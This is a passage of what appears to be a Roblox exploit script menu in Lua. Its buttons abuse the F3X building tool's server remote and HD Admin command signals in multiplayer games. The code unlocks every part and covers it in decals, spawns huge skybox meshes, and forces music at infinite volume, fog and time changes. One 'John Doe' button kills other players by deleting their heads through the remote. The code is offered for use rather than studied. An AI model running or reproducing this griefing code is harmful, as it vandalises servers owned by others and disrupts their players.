		task.wait(0.01) -- you can reduce this for faster spam (e.g. 0.05)
	end
end)
    end
})
AddButton({
    Name = "Noot Noot Remake",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";time 6")
SilentRequest:InvokeServer(";fogcolor black")
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Locate SyncAPI tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
        break
    end
end
if not tool then
    for _, v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
end
if not tool then
    error("SyncAPI tool not found")
end

local remote = tool.SyncAPI.ServerEndpoint

-- Silent remote call wrapper
local function _(args)
    remote:InvokeServer(unpack(args))
end

-- === Helper Functions ===
local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end

-- === Giant Skybox Function ===
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)

    -- Create a base part
    CreatePart(CFrame.new(pos), workspace)
    task.wait(0.3) -- wait for it to exist

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- sphere/dome mesh
            SetTexture(v, id)             -- your sky texture asset ID
            MeshResize(v, Vector3.new(65000, 65000, 65000)) -- massive size
            SetCollision(v, false)
            SetLocked(v, true)
        end
    end
end
GiantSky("382332426")


	-----------------------------------

	local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("382332426")
	-----------
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- DO NOT DELETE THIS LEAVE MY CREDIT

-- Rain Toad Script By ItsKittyyyGD 

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function SetCollision(part, boolean)
    local args = {
        [1] = "SyncCollision",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CanCollide"] = boolean
            }
        }
    }
    _(args)
end

function SetAnchor(boolean, part)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    _(args)
end

function CreatePart(cf)
    local args = {
        [1] = "CreatePart",
        [2] = "Normal",
        [3] = cf,
        [4] = workspace
    }
    _(args)
end

function Resize(part, size, cf)
    local args = {
        [1] = "SyncResize",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CFrame"] = cf,
                ["Size"] = size
            }
        }
    }
    _(args)
end

function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

function SetMesh(part, meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://" .. meshid
            }
        }
    }
    _(args)
end

function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = "rbxassetid://" .. texid
            }
        }
    }
    _(args)
end

function MeshResize(part, size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    _(args)
end

function SetName(part, stringg)
    local args = {
        [1] = "SetName",
        [2] = {
            [1] = workspace.Part
        },
        [3] = stringg
    }
    _(args)
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(true, v)
            AddMesh(v)
            SetMesh(v, "14832966960")
            SetTexture(v, id)
            MeshResize(v, Vector3.new(0, 0, 0))
        end
    end
end

local function createRainToads()
    while true do
        wait(0.001) -- Here they change the appearance time of the Toads or other meshes
        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
            local hrpcf = player.Character.HumanoidRootPart.CFrame
            local x = hrpcf.x
            local z = hrpcf.z
            local randint = math.random(-600, 600)
            local randint2 = math.random(-600, 600)
            local xloc = randint + x
            local zloc = randint2 + z
            local cf = player.Character.HumanoidRootPart.CFrame.y + 400

            spawn(function()
                local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
                for i, v in game.Workspace:GetDescendants() do
                    if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
                        SetName(v, "NOOT NOOT") -- Here the name of the toad changes
                        SetAnchor(false, v)
                        AddMesh(v)
                        Resize(v, Vector3.new(1, 1, 1), v.CFrame)
                        MeshResize(v, Vector3.new(200, 200, 200))
                        SetMesh(v, "111891702759441") -- Here put it A custom mesh
                        SetTexture(v, "382332426") -- X2
                        SetCollision(v, true)
                        v.Orientation = Vector3.new(0, 0, 0)

                        v.CFrame = v.CFrame + Vector3.new(0, 0, 0)

                        local sound = Instance.new("Sound", v)
                        sound.SoundId = "rbxassetid://153752123" -- Here the noise or another sound To the toads or other things It works when they appear 
                        sound.Volume = 0
                        sound.PlayOnRemove = true
                        sound:Destroy()
                    end
                end
            end)
        else
            wait(1)
        end
    end
end

coroutine.wrap(createRainToads)()

Sky("95921788891849") -- Here they change the skybox id 

-- Delete this if you are going to Use it in another script
    end
})
AddButton({
    Name = "Lnicky Bypassed decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("102045708453546")
end
})
AddButton({
    Name = "SpinningChip Sky",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";music 70635213877495")
SilentRequest:InvokeServer(";pitch 0.1625")
SilentRequest:InvokeServer(";volume inf")
wait(1.5)
SilentRequest:InvokeServer(";fogcolor black ;time 0")

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint
local RunService = game:GetService("RunService")

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    local args = {
        [1] = "CreatePart",
        [2] = "Normal",
        [3] = cf,
        [4] = parent
    }
    _(args)
end

function SetAnchor(part, boolean)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    _(args)
end

function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

function SetMesh(part, meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://" .. meshid
            }
        }
    }
    _(args)
end

function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = texid
            }
        }
    }
    _(args)
end

function MeshResize(part, size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    _(args)
end

function SetTransparency(part, value)
    local args = {
        [1] = "SyncTransparency",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Transparency"] = value
            }
        }
    }
    _(args)
end

function DestroyPart(part)
    local args = {
        [1] = "Remove",
        [2] = {
            [1] = part
        }
    }
    _(args)
end

local images = {
    "http://www.roblox.com/asset/?id=92815472048859",
    "http://www.roblox.com/asset/?id=70550203344088",
    "http://www.roblox.com/asset/?id=106235416208776",
    "http://www.roblox.com/asset/?id=110559328229354",
}

local skyPart
local skyLoop
local frameTime = 1 / 10
local lastUpdate = 0

function CreateSky()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local cf = hrp.CFrame
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

    local found = false
    for i = 1, 50 do
        task.wait()
        for _, v in workspace:GetDescendants() do
            if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
                skyPart = v
                found = true
                break
            end
        end
        if found then break end
    end

    if not skyPart then return end

    SetAnchor(skyPart, true)
    AddMesh(skyPart)
    SetMesh(skyPart, "111891702759441")
    MeshResize(skyPart, Vector3.new(90000, 90000, 90000)) -- skybox size updated here
    SetTransparency(skyPart, 0)

    local index = 1
    skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
        lastUpdate = lastUpdate + deltaTime
        if lastUpdate >= frameTime then
            lastUpdate = 0
            if not skyPart then
                skyLoop:Disconnect()
                return
            end
            SetTexture(skyPart, images[index])
            index = (index % #images) + 1
        end
    end)
end

function ResetSky()
    if skyLoop then
        skyLoop:Disconnect()
        skyLoop = nil
    end
    if skyPart then
        DestroyPart(skyPart)
        skyPart = nil
    end
    task.spawn(CreateSky)
end

player.CharacterAdded:Connect(function(newChar)
    char = newChar
    ResetSky()
end)

if char and char:FindFirstChild("Humanoid") then
    char:WaitForChild("Humanoid").Died:Connect(function()
        ResetSky()
    end)
end

CreateSky()
end
})
AddButton({
    Name = "1x1x1x1",
    Callback = function()
        -- HD Admin Commands
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";fogcolor black")
SilentRequest:InvokeServer(";time 0")

-- SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

-- SyncAPI Functions
local function _(args)
    remote:InvokeServer(unpack(args))
end

local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end

local function SpawnDecal(part, side)
    _({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})
end

local function AddDecal(part, asset, side)
    _({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}}})
end

local function SetVertexColor(part, color)
    _({"SyncMesh", {{Part = part, VertexColor = color}}})
end

-- Giant Sky Function (65000-70000 scale)
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)
    CreatePart(CFrame.new(pos), workspace)
    task.wait(0.3)

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- sphere mesh
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(3, 3, 3)) -- vertex color
            MeshResize(v, Vector3.new(109888, 109888, 109888)) -- massive scale
            SetCollision(v, false)
            SetLocked(v, true)
        end
    end
end

-- Spam Function
local function Spam(id)
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") then
            task.spawn(function()
                SetLocked(v, false)
                for _, side in ipairs(Enum.NormalId:GetEnumItems()) do
                    SpawnDecal(v, side)
                    AddDecal(v, id, side)
                end
            end)
        end
    end
end

-- Execute (Decal spam first, then skybox)
Spam("6147424071") -- spam decals first
GiantSky("6147424071") -- giant skybox second
    end
})
AddButton({
    Name = "LazyTown Sky",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black ;time 0")
        
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

function SetAnchor(part, state)
    _({"SyncAnchor", {{["Part"] = part, ["Anchored"] = state}}})
end

function AddMesh(part)
    _({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
    _({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid}}})
end

function SetTexture(part, texid)
    _({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid}}})
end

function MeshResize(part, size)
    _({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function SetVertexColor(part, color)
    _({"SyncMesh", {{["Part"] = part, ["VertexColor"] = color}}})
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(5, 5, 5))
            MeshResize(v, Vector3.new(109888, 109888, 109888))
        end
    end
end

-- Usage
Sky("110240864101518")
end
})
AddButton({
    Name = "John Doe",
    Callback = function()
        local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Track if script should be active
local scriptActive = true
local inputConnection
local descendantConnection

-- Function to completely stop the script
local function disableScript()
    scriptActive = false
    if inputConnection then
        inputConnection:Disconnect()
    end
    if descendantConnection then
        descendantConnection:Disconnect()
    end
end

for i,v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
for i,v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

remote = tool.SyncAPI.ServerEndpoint
function _(args)
    remote:InvokeServer(unpack(args))
end

local function Color(part, color)
    local args = {
        "SyncColor",
        {
            {
                Part = part,
                Color = color,
                UnionColoring = false
            }
        }
    }
    _(args)
end

local function applyDecorationToPart(part)
    local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire"
            }
        }
    }
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire",
                ["Size"] = 3,
                ["Heat"] = 25,
                ["Color"] = Color3.fromRGB(255, 0, 0),
                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0)
            }
        }
    }
    _(argsCreate)
    _(argsSync)
end

local function Parter(part)
    local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Smoke"
            }
        }
    }
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Smoke",
                ["Size"] = 3,
                ["Color"] = Color3.fromRGB(255, 0, 0),
            }
        }
    }
    _(argsCreate)
    _(argsSync)
end

local function eyePart(part)
    local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire"
            }
        }
    }
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire",
                ["Size"] = 1,
                ["Heat"] = 12,
                ["Color"] = Color3.fromRGB(155, 0, 0),
                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0)
            }
        }
    }
    _(argsCreate)
    _(argsSync)
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Apply character setup
RequestCommand:InvokeServer(";removeaccessories")
RequestCommand:InvokeServer(";titlebk me John Doe")
wait(1)
RequestCommand:InvokeServer(";hat me 107676946962151")
wait(0.9)
RequestCommand:InvokeServer(";hat me 18196403126")
wait(1)
RequestCommand:InvokeServer(";hat me 18801497637")
wait(1)
RequestCommand:InvokeServer(";shirt me 100276101149100")
wait(1)
RequestCommand:InvokeServer(";head me 0")
RequestCommand:InvokeServer(";face me 144075659")
wait(1)
RequestCommand:InvokeServer(";shirt me 100276101149100")
RequestCommand:InvokeServer(";pants me 109662040845019")
wait(1.8)
RequestCommand:InvokeServer(";time 0")

local eye = char:FindFirstChild("Accessory (JohnEye)").Handle
local arm = char:FindFirstChild("Right Arm")
local tor = char:FindFirstChild("Torso")
local ar2 = char:FindFirstChild("Left Arm")
local RLeg = char:FindFirstChild("Right Leg")
local head = char:FindFirstChild("Head")
local LLeg = char:FindFirstChild("Left Leg")

applyDecorationToPart(arm)
applyDecorationToPart(ar2)
eyePart(eye)
Parter(tor)

Color(arm, Color3.fromRGB(252, 255, 150))
Color(ar2, Color3.fromRGB(252, 255, 150))
Color(head, Color3.fromRGB(252, 255, 150))
Color(tor, Color3.fromRGB(255, 255, 0))
Color(RLeg, Color3.fromRGB(0, 200, 255))
Color(LLeg, Color3.fromRGB(0, 200, 255))

local arm = character:FindFirstChild("Right Arm")
local humanoid = character:FindFirstChildOfClass("Humanoid")

-- Detect when character is removed (happens during respawn)
player.CharacterRemoving:Connect(function()
    disableScript()
end)

humanoid.Died:Connect(function()
    disableScript()
end)

local animator = humanoid:FindFirstChildOfClass("Animator")
local attackAnim = Instance.new("Animation")
attackAnim.AnimationId = "rbxassetid://186934658"
local attackTrack = animator:LoadAnimation(attackAnim)

function KillTarget(target)
    if not scriptActive then return end
    if target and target.Character then
        local head = target.Character:FindFirstChild("Head")
        if head then
            local args = {
                [1] = "SetLocked",
                [2] = {
                    [1] = head
                },
                [3] = false
            }
            remote:InvokeServer(unpack(args))
            task.wait(0.1)
            local args2 = {
                [1] = "Remove",
                [2] = {
                    [1] = head
                }
            }
            remote:InvokeServer(unpack(args2))
        end
    end
end

local function attack()
    if not scriptActive then return end
    attackTrack:Play()
    local hitPlayer = nil
    local touchedConnection

    local function onTouch(other)
        if not scriptActive then return end
        local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
        if otherPlayer and otherPlayer ~= player then
            hitPlayer = otherPlayer
        end
    end

    touchedConnection = arm.Touched:Connect(onTouch)
    task.wait(0.5)
    if touchedConnection then
        touchedConnection:Disconnect()
    end
    if hitPlayer then
        RequestCommand:InvokeServer(";music 82500396906354 ;volume 0.5")
        KillTarget(hitPlayer)
        task.wait(1)
        RequestCommand:InvokeServer(";unmusic")
    else
        RequestCommand:InvokeServer(";music 28144425 ;pitch 0.6 ;volume 7")
        task.wait(0.8)
        RequestCommand:InvokeServer(";unmusic")
    end
end

-- === Input Replacement ===
local canAttack = true
local function attackWithCooldown()
    if not scriptActive or not canAttack then return end
    canAttack = false
    attack()
    task.delay(2.2, function()
        canAttack = true
    end)
end

inputConnection = UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if not scriptActive then 
        return 
    end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        attackWithCooldown()
    end
end)

-- === F3X Utility Functions ===
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then
            return v
        end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then
            return v
        end
    end
    return nil
end

local f3x = getf3x()
if not f3x then
    warn("you dont have f3x skid")
end
local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

function _(args)
    serverendpoint:InvokeServer(unpack(args))
end

local function fire(part)
    local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire"
            }
        }
    }
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire",
                ["Size"] = 15,
                ["Heat"] = 15,
                ["Color"] = Color3.fromRGB(255, 0, 0),
                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0)
            }
        }
    }
    _(argsCreate)
    _(argsSync)
end

function delete(part)
    local args = {
        [1] = "Remove",
        [2] = {
            [1] = part
        }
    }
    _(args)
end

function MovePart(part, cf)
    local args = {
        "SyncMove",
        {
            {
                Part = part,
                CFrame = cf
            }
        }
    }
    _(args)
end

local function resize(part, size, cf)
    local args = {
        "SyncResize",
        {
            {
                Part = part,
                CFrame = cf,
                Size = size
            }
        }
    }
    _(args)
end

local function syncmaterial(part, mate)
    local args = {
        "SyncMaterial",
        {
            {
                Part = part,
                Material = mate
            }
        }
    }
    _(args)
end

local function transparency(part, trans)
    local args = {
        "SyncMaterial",
        {
            {
                Part = part,
                Transparency = trans
            }
        }
    }
    _(args)
end

local function color(part, color)
    local args = {
        "SyncColor",
        {
            {
                Part = part,
                Color = color,
                UnionColoring = false
            }
        }
    }
    _(args)
end

local function syncmeshid(part, id)
    local args = {
        "SyncMesh",
        {
            {
                Part = part,
                MeshId = "rbxassetid://" .. id
            }
